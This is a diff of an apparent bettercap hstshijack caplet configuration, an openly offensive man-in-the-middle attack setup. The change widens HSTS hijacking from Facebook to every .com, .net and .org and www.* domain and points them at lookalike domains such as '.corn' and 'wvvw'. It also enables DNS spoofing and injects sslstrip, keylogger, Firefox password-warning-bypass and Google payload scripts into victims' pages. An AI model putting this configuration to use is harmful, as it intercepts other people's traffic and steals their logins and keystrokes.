@@ -2,15 +2,15 @@
 
 set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
 set hstshijack.ignore          *
-set hstshijack.targets         facebook.com,*.facebook.com
-set hstshijack.replacements    facedook.com,*.facedook.com
-set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
+set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
+#set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/firefox-bypass-password-warning.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-set dns.spoof.domains  facedook.com,*.facedook.com
+set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq
 
 http.proxy  on
 dns.spoof   on
